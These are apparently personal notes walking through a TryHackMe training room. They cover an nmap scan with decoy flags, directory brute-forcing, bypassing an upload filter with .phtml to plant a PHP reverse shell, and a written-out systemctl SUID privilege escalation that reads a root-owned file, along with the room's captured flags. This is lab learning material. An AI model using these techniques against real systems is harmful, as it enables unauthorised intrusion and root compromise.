# VulnVersity Try Hack Me Notes

MY IP = 10.8.19.163

Target IP = 10.10.115.190

Scan Target for open ports.

	nmap command: "nmap -f -sC -sV -p- -D RND:10 10.10.115.190"

		Scan Results:



Gobuster to find web server paths. 

	Command: "gobuster dir -u http://10.10.115.190:3333 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt"

		Results:

			2020/05/13 14:56:09 Starting gobuster
			===============================================================
			/images (Status: 301) - pics for wensite nothing worth time.
			/css (Status: 301) - Nothing
			/js (Status: 301) - Nothing
			/fonts (Status: 301) - Nothing
			/internal (Status: 301) - Bingo! File uploading. Checking for a /uploads/ directory.

				Found new directory: http://10.10.115.190:3333/internal/uploads/

				Can launch a file thats uploaded.

				.html and .php not allowed.

Burpsuite to run intruder and see what file extensions are allowed.

	Created a list of http common extensions to load into intruder.

	Discovered that .phtml is able to be uploaded.

	uploaded a php reverse shell.

	have access as www-data.

	Bill is the local user on the machine.

	USER Flag is: 8bd7992fbe8a6ad22a63361004cfcedb

ESCALATION TIME:

	To find processes on the system I followed the write up that explains very well the escalation process. Used the following command:

		find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null

		Found /bin/systemctl

	GTFOBins has CLI exploits to escalate privileges.

		First we create a variable which holds a unique file.

	
$ eop=$(mktemp).service

Then we create an unit file and write it into the variable.
	
$ echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $eop

/bin/systemctl link $eop

Created symlink from /etc/systemd/system/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.

/bin/systemctl enable --now $eop
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.x1uzp01alO.service to /tmp/tmp.x1uzp01alO.service.


ls -lah /tmp
total 52K
drwxrwxrwt  8 root     root     4.0K May 13 15:39 .
drwxr-xr-x 23 root     root     4.0K Jul 31  2019 ..
drwxrwxrwt  2 root     root     4.0K May 13 14:47 .ICE-unix
drwxrwxrwt  2 root     root     4.0K May 13 14:47 .Test-unix
drwxrwxrwt  2 root     root     4.0K May 13 14:47 .X11-unix
drwxrwxrwt  2 root     root     4.0K May 13 14:47 .XIM-unix
drwxrwxrwt  2 root     root     4.0K May 13 14:47 .font-unix
-rw-r--r--  1 root     root       33 May 13 15:39 output
drwx------  3 root     root     4.0K May 13 14:47 systemd-private-5f83ff70cbf74ceea97e8050bd6cc847-systemd-timesyncd.service-yXCZYv
-rw-------  1 www-data www-data    0 May 13 15:38 tmp.6Si7nckONS
-rw-rw-rw-  1 www-data www-data  103 May 13 15:38 tmp.6Si7nckONS.service
-rw-------  1 www-data www-data    0 May 13 15:28 tmp.NDPobSHQdA
-rw-rw-rw-  1 www-data www-data  100 May 13 15:28 tmp.NDPobSHQdA.service
-rw-------  1 www-data www-data    0 May 13 15:22 tmp.Xfvg2kWovt
-rw-rw-rw-  1 www-data www-data  122 May 13 15:23 tmp.Xfvg2kWovt.service
-rwx--x--x  1 www-data www-data    8 May 13 15:24 tmp.fuIcP4MGNq
-rw-------  1 www-data www-data    0 May 13 15:36 tmp.iRxJQGBqaM
-rw-------  1 www-data www-data    0 May 13 15:37 tmp.sZToSR22JH
$ cat /tmp/output
#a58ff8579f0a9270368d33a9966c7fd5 - ROOT FLAG! worked.

